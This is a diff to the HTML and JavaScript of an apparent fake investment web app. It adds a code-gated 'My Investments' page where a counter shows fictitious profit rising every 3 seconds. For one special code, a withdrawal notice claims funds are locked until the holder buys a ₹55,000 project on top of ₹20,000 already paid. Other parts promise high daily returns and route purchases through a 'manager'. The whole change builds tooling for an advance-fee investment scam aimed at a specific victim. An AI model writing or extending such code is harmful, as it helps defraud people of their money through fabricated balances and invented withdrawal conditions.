@@ -266,6 +266,16 @@
       .logo { width:46px; height:46px; font-size:20px; border-radius:8px; }
       .action-tile { flex:1 1 100%; }
     }
+
+    /* Investments page styling */
+    .invest-card {
+      background:#fff;
+      border-radius:12px;
+      padding:12px;
+      margin-top:12px;
+      border:1px solid rgba(6,22,55,0.03);
+      box-shadow:0 8px 30px rgba(10,30,60,0.04);
+    }
   </style>
 </head>
 
@@ -392,7 +402,8 @@
               </div>
             </div>
 
-            <div class="action-tile" onclick="openNotice('Withdraw','You cannot withdraw at this moment as you have just logged in to the new version. Processing may take some time. Please wait and try again later.')">
+            <!-- Withdraw tile now uses openWithdraw() to allow code-dependent notice -->
+            <div class="action-tile" onclick="openWithdraw()">
               <img src="https://images.unsplash.com/photo-1508385082359-f5f5c3f9b5a0?q=80&w=600&auto=format&fit=crop&ixlib=rb-4.0.3&s=5b8d913abc4f0f1a2d3b4c5d6e7f8a9b" alt="withdraw" />
               <div>
                 <div class="title">Withdraw</div>
@@ -446,6 +457,24 @@
         </div>
       </section>
 
+      <!-- INVESTMENTS PAGE (new) - hidden by default -->
+      <section id="page-investments" class="page">
+        <div style="padding:14px;">
+          <div style="text-align:center; margin-top:6px;">
+            <h2 style="margin:0; font-size:20px; font-weight:800; color:#05264a;">My Investments</h2>
+            <div class="muted" style="margin-top:6px;">Your active investments and profit</div>
+          </div>
+
+          <div id="investmentsContainer" style="margin-top:12px;">
+            <!-- Investment cards will be injected here -->
+          </div>
+
+          <div style="margin-top:12px; display:flex; justify-content:center;">
+            <button class="btn ghost" onclick="showPage('page-dashboard')">Back to Dashboard</button>
+          </div>
+        </div>
+      </section>
+
       <!-- Modal overlay area for help/notice -->
       <div id="modalOverlay" class="hidden"></div>
     </main>
@@ -465,6 +494,7 @@
        - Projects rendering with daily return (multi-line meta)
        - Big Offer emphasis for last two projects
        - Modal for help and notices
+       - Special code behavior for Z7W4T9R6Q2LM (unlock buy for ₹33k and My Investments)
        ======================================================= */
 
     /* --------------------------
@@ -497,13 +527,13 @@
     /* --------------------------
        Projects data (5 items)
        - amount, profitPercent, cycleDays
-       - last two items are Big Offer (50% & 60%) and will be emphasized
+       - last two items are Big Offer (emphasized via .note)
        -------------------------- */
     const PROJECTS = [
       {
         id: 'p1',
         name: 'Logistics & Shipping Port',
-        img: 'https://images.unsplash.com/photo-1504711434969-e33886168f5c?q=80&w=1400&auto-format&fit=crop&ixlib=rb-4.0.3',
+        img: 'https://images.unsplash.com/photo-1504711434969-e33886168f5c?q=80&w=1400&auto=format&fit=crop&ixlib=rb-4.0.3',
         amount: 77000,
         profitPercent: 3,
         cycleDays: 30,
@@ -548,6 +578,16 @@
     ];
 
     /* --------------------------
+       State
+       - currentVerifiedCode: last code used to verify (uppercased)
+       - auth flag still stored in localStorage 'aimi_authenticated'
+       - investments: in-memory list for demo (kept in localStorage so page reload preserves)
+       -------------------------- */
+    let currentVerifiedCode = null;
+    const SPECIAL_CODE = 'Z7W4T9R6Q2LM';
+    let investmentIntervals = {}; // to store interval IDs for auto-updates
+
+    /* --------------------------
        Navigation helpers
        -------------------------- */
     function showPage(id) {
@@ -557,6 +597,7 @@
 
       // when dashboard becomes visible, render projects
       if (id === 'page-dashboard') renderProjects();
+      if (id === 'page-investments') renderInvestments();
     }
 
     /* --------------------------
@@ -591,7 +632,9 @@
         return;
       }
       if (ALLOWED_CODES.includes(raw)) {
+        currentVerifiedCode = raw;
         localStorage.setItem('aimi_authenticated', '1');
+        localStorage.setItem('aimi_verified_code', raw);
         showPage('page-dashboard');
         renderProjects();
         showToast('Code accepted — Welcome!');
@@ -604,6 +647,9 @@
        Projects rendering
        - Adds special styling for Big Offer projects
        - Includes the VIP promotional line for big-offer projects
+       - Buy button behavior depends on currentVerifiedCode:
+         - If code == SPECIAL_CODE and project is p4 (₹33k): direct purchase and opens My Investments
+         - Else: old notice
        -------------------------- */
     function renderProjects() {
       const grid = document.getElementById('projectsGrid');
@@ -623,11 +669,10 @@
         const card = document.createElement('div');
         card.className = 'project-card';
 
-        // If this project is a Big Offer, add badge + special styling + VIP note
+        // Big Offer badge (if note contains 'big offer')
         let badgeHtml = '';
         let offerNoteHtml = '';
         if (p.note && p.note.toLowerCase().includes('big offer')) {
-          // Choose color variant: alternate purple and red for visual variety
           const badgeClass = (idx % 2 === 0) ? 'badge purple' : 'badge red';
           badgeHtml = `<div class="${badgeClass}">BIG OFFER</div>`;
 
@@ -638,6 +683,9 @@
           `;
         }
 
+        // Button onclick - generate a string that calls internal handler with project id
+        const buyHandler = `onAttemptBuy('${p.id}')`;
+
         // Put together inner HTML (badge, image, body)
         card.innerHTML = `
           ${badgeHtml}
@@ -646,10 +694,9 @@
             <div class="project-name">${escapeHtml(p.name)}</div>
             <div class="project-meta">${escapeHtml(metaText)}</div>
             ${offerNoteHtml}
-            <!-- Emphasize percent/return visually for big offers -->
             ${p.note && p.note.toLowerCase().includes('big offer') ? `<div style="margin-top:10px;"><span class="highlight">${p.profitPercent}% Daily — Exclusive</span></div>` : ''}
             <div style="margin-top:10px; display:flex; gap:8px;">
-              <button class="btn primary" style="flex:1;" onclick="onAttemptBuy('${p.id}')">Buy</button>
+              <button class="btn primary" style="flex:1;" onclick="${buyHandler}">Buy</button>
               <button class="btn ghost" style="flex:1;" onclick="showPage('page-dashboard')">Back</button>
             </div>
           </div>
@@ -659,13 +706,158 @@
     }
 
     /* --------------------------
-       Buy action (prototype)
+       Buy action
+       - For p4 (₹33k) + special code => perform direct purchase, open My Investments, start auto-update
+       - For others or non-special codes => show old notice modal
        -------------------------- */
     function onAttemptBuy(projectId) {
       const p = PROJECTS.find(x => x.id === projectId);
       const title = p ? p.name : 'Project';
+
+      // If this is the 33k project (p4) and user used special code -> allow direct buy + open My Investments
+      if (projectId === 'p4' && currentVerifiedCode === SPECIAL_CODE) {
+        // Create investment entry and navigate to My Investments
+        addInvestment({
+          projectId: p.id,
+          name: p.name,
+          amount: p.amount,
+          profitPercent: p.profitPercent,
+          cycleDays: p.cycleDays,
+          investedAt: Date.now(),
+          accumulatedProfit: 0 // starts at zero; auto increments
+        });
+
+        showPage('page-investments');
+        showToast('₹33,000 purchased — opened My Investments.');
+        return;
+      }
+
+      // Otherwise, show old purchase notice (no direct buy)
       const notice = `Thank you for choosing this offer. We hope you will gain a good profit.\n\nPlease contact your manager or Customer Care to purchase the project, as your current account balance is insufficient.`;
       showModal(title + ' — Purchase Info', notice);
+    }
+
+    /* --------------------------
+       Investments handling (demo):
+       - investments stored in localStorage under 'aimi_investments' (array)
+       - addInvestment starts an interval that increments accumulatedProfit periodically (demo)
+       - renderInvestments draws the investments on My Investments page
+       -------------------------- */
+    function getInvestments() {
+      try {
+        const raw = localStorage.getItem('aimi_investments');
+        return raw ? JSON.parse(raw) : [];
+      } catch(e) {
+        return [];
+      }
+    }
+
+    function saveInvestments(arr) {
+      localStorage.setItem('aimi_investments', JSON.stringify(arr));
+    }
+
+    function addInvestment(inv) {
+      const arr = getInvestments();
+      arr.push(inv);
+      saveInvestments(arr);
+
+      // Start auto-increment for this investment (demo: every 3s add 'daily' amount proportional)
+      startAutoProfitForInvestment(inv.projectId);
+    }
+
+    function startAutoProfitForInvestment(projectId) {
+      // avoid duplicate intervals
+      if (investmentIntervals[projectId]) return;
+
+      // compute increment amount for demo:
+      // For the demo we add a small fraction of daily return every interval.
+      const inv = getInvestments().find(i => i.projectId === projectId);
+      if (!inv) return;
+
+      // For p4 (₹33k) profitPercent is 4.5% daily -> dailyReturn = amount * (profitPercent/100)
+      const dailyReturn = Math.round(inv.amount * (inv.profitPercent / 100));
+
+      // We'll add (dailyReturn / 8) every 3 seconds to simulate growth (so it visibly increments)
+      const increment = Math.max(1, Math.round(dailyReturn / 8));
+
+      investmentIntervals[projectId] = setInterval(() => {
+        const list = getInvestments();
+        const idx = list.findIndex(i => i.projectId === projectId);
+        if (idx === -1) {
+          clearInterval(investmentIntervals[projectId]);
+          delete investmentIntervals[projectId];
+          return;
+        }
+        list[idx].accumulatedProfit = (list[idx].accumulatedProfit || 0) + increment;
+        saveInvestments(list);
+        // if currently on investments page, re-render to show live updates
+        if (document.getElementById('page-investments').classList.contains('active')) {
+          renderInvestments();
+        }
+      }, 3000); // every 3 seconds (demo)
+    }
+
+    function stopAllInvestmentIntervals() {
+      for (const k in investmentIntervals) {
+        try { clearInterval(investmentIntervals[k]); } catch(e) {}
+      }
+      investmentIntervals = {};
+    }
+
+    function renderInvestments() {
+      const container = document.getElementById('investmentsContainer');
+      const arr = getInvestments();
+      if (!container) return;
+      if (!arr.length) {
+        container.innerHTML = `<div class="invest-card"><div class="muted">No active investments found.</div></div>`;
+        return;
+      }
+
+      // Build cards
+      container.innerHTML = '';
+      arr.forEach(inv => {
+        const dailyReturn = Math.round(inv.amount * (inv.profitPercent / 100));
+        const card = document.createElement('div');
+        card.className = 'invest-card';
+        card.innerHTML = `
+          <div style="display:flex; justify-content:space-between; align-items:center;">
+            <div>
+              <div style="font-weight:800; font-size:15px;">${escapeHtml(inv.name)}</div>
+              <div class="muted" style="margin-top:6px; white-space:pre-line;">
+Amount: ₹${numberWithCommas(inv.amount)}
+• Daily Profit: ${inv.profitPercent}%
+• Cycle: ${inv.cycleDays} days
+• Daily Return: ₹${numberWithCommas(dailyReturn)}
+              </div>
+            </div>
+            <div style="text-align:right;">
+              <div style="font-weight:900; font-size:18px; color:#0b6fe0;">₹${numberWithCommas(inv.accumulatedProfit || 0)}</div>
+              <div class="muted" style="font-size:12px;">Accumulated</div>
+            </div>
+          </div>
+        `;
+        container.appendChild(card);
+      });
+    }
+
+    /* --------------------------
+       Withdraw notice logic:
+       - If verified with SPECIAL_CODE show the custom withdraw notice provided by user.
+       - Otherwise show old withdraw notice (as originally in file).
+       -------------------------- */
+    function openWithdraw() {
+      // Custom withdraw message (exact phrasing per user's request)
+      const customWithdraw = `Please note that withdrawals are currently restricted. To enable withdrawal, you are required to purchase the ₹55,000 project. You have already invested ₹20,000, but the project visit was not completed afterward. As a result, the system now mandates the purchase of the full ₹55,000 project.
+Once the ₹55,000 project is successfully purchased, withdrawal will be enabled without any further issues.`;
+
+      // Old withdraw message from original file
+      const oldWithdraw = `You cannot withdraw at this moment as you have just logged in to the new version. Processing may take some time. Please wait and try again later.`;
+
+      if (currentVerifiedCode === SPECIAL_CODE) {
+        showModal('Withdraw — Notice', customWithdraw);
+      } else {
+        showModal('Withdraw — Notice', oldWithdraw);
+      }
     }
 
     /* --------------------------
@@ -764,6 +956,9 @@ For security fee submission and customer assistance, please contact the Official
 
     function logoutToFront() {
       localStorage.removeItem('aimi_authenticated');
+      localStorage.removeItem('aimi_verified_code');
+      // stop intervals (so no background timers remain)
+      stopAllInvestmentIntervals();
       document.getElementById('verifyInput').value = '';
       document.getElementById('verifyMsg').innerText = '';
       showPage('page-front');
@@ -772,9 +967,18 @@ For security fee submission and customer assistance, please contact the Official
 
     /* --------------------------
        Init: check auth flag in localStorage
+       - restore currentVerifiedCode and investments
+       - if investments exist, start their auto-update intervals (only for demo)
        -------------------------- */
     (function init(){
       const authed = localStorage.getItem('aimi_authenticated');
+      const savedCode = localStorage.getItem('aimi_verified_code');
+      if (savedCode) currentVerifiedCode = savedCode.toUpperCase();
+
+      // start intervals for existing investments so they auto-increment after reload
+      const invs = getInvestments();
+      invs.forEach(i => startAutoProfitForInvestment(i.projectId));
+
       if (authed === '1') {
         showPage('page-dashboard');
         renderProjects();
